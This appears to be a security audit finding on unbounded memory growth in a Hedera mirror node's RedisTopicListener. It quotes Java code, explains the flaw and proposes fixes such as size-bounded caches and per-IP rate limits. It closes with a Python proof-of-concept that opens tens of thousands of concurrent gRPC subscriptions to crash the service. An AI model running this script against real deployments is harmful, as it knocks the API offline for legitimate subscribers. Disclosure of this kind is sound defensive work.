### Title
Unbounded `ConcurrentHashMap` Growth in `RedisTopicListener` via Concurrent Subscriptions to Unique Topic IDs

### Summary
`RedisTopicListener.topicMessages` is an unbounded `ConcurrentHashMap` that accumulates one entry per unique topic ID for every active gRPC subscription. An attacker who maintains a large number of concurrent gRPC connections—each subscribing to a distinct topic ID—can grow this map without limit, exhausting JVM heap memory and crashing the gRPC service for all subscribers. No application-level rate limiting or map-size cap exists to prevent this.

### Finding Description

**Exact code path:**

`RedisTopicListener.java`, `getSharedListener` (line 59–62):
```java
@Override
protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
    Topic topic = getTopic(filter);
    return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
}
``` [1](#0-0) 

The map key is `"topic.<id>"` derived from `filter.getTopicId().getId()`:
```java
private Topic getTopic(TopicMessageFilter filter) {
    return ChannelTopic.of(String.format("topic.%d", filter.getTopicId().getId()));
}
``` [2](#0-1) 

The map is declared with no capacity bound:
```java
this.topicMessages = new ConcurrentHashMap<>();
``` [3](#0-2) 

**Cleanup mechanism and why it is insufficient:**

Entries are removed only via `doOnCancel`/`doOnComplete` on the shared Flux:
```java
.doOnCancel(() -> unsubscribe(topic))
.doOnComplete(() -> unsubscribe(topic))
``` [4](#0-3) 

Because `.share()` is used, the upstream is only cancelled when the **last** subscriber to a given topic disconnects. As long as the attacker keeps at least one connection open per topic, the map entry persists indefinitely. There is no TTL, no maximum map size, and no eviction policy.

**Topic-existence guard and its conditionality:**

`TopicMessageServiceImpl.topicExists` can reject non-existent topics, but only when `grpcProperties.isCheckTopicExists()` returns `true`:
```java
.switchIfEmpty(
    grpcProperties.isCheckTopicExists()
        ? Mono.error(new EntityNotFoundException(topicId))
        : Mono.just(Entity.builder().memo("").type(EntityType.TOPIC).build()))
``` [5](#0-4) 

When `checkTopicExists=false`, any arbitrary numeric topic ID passes validation and causes a new map entry. Even when `checkTopicExists=true`, an attacker who creates real Hedera topics (a permissionless, fee-based operation) can still drive unbounded map growth.

**No rate limiting or connection cap** exists at the application layer in `ConsensusController`, `TopicMessageServiceImpl`, or `RedisTopicListener`. [6](#0-5) 

### Impact Explanation
Each map entry holds a live `Flux<TopicMessage>` backed by an active Redis pub/sub channel subscription. With N concurrent connections to N distinct topic IDs, the JVM heap must hold N `Flux` objects, N Redis channel registrations, and N `ConcurrentHashMap` entries. At sufficient scale this causes an `OutOfMemoryError`, crashing the gRPC process and denying service to all legitimate subscribers. The impact is a complete availability loss for the gRPC API.

### Likelihood Explanation
The attack requires only the ability to open many concurrent TCP/gRPC connections—no authentication, no privileged account, and no special knowledge of the system. When `checkTopicExists=false`, arbitrary topic IDs work immediately. When `checkTopicExists=true`, Hedera topic creation is permissionless (anyone can pay the small HBAR fee), so a moderately funded attacker can pre-create thousands of topics and then subscribe to all of them simultaneously. The attack is repeatable and can be automated with a simple script.

### Recommendation
1. **Bound the map size**: Replace `ConcurrentHashMap` with a size-limited structure (e.g., Caffeine `LoadingCache` with `maximumSize`) so that the oldest/least-used entries are evicted automatically.
2. **Enable `checkTopicExists` by default**: Ensure the guard is on by default so that subscriptions to non-existent topics are rejected before any map entry is created.
3. **Rate-limit subscriptions per client IP**: Add a gRPC interceptor that enforces a maximum number of concurrent subscriptions per source address.
4. **Cap concurrent subscriptions globally**: Enforce a server-wide limit on the total number of active `topicMessages` entries and reject new subscriptions when the cap is reached.

### Proof of Concept
```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

# Assumes checkTopicExists=false or pre-created topics
GRPC_HOST = "mirror-node:5600"
NUM_TOPICS = 50000  # adjust to available heap

def subscribe(topic_num):
    channel = grpc.insecure_channel(GRPC_HOST)
    stub = ConsensusServiceStub(channel)
    request = ConsensusTopicQuery(topicID=TopicID(topicNum=topic_num))
    try:
        # Block indefinitely to keep the map entry alive
        for _ in stub.subscribeTopic(request):
            pass
    except Exception:
        pass

with ThreadPoolExecutor(max_workers=NUM_TOPICS) as pool:
    for i in range(1, NUM_TOPICS + 1):
        pool.submit(subscribe, i)
# Each call inserts a new entry into topicMessages ConcurrentHashMap.
# With enough topics, the gRPC JVM process runs out of heap and crashes.
```
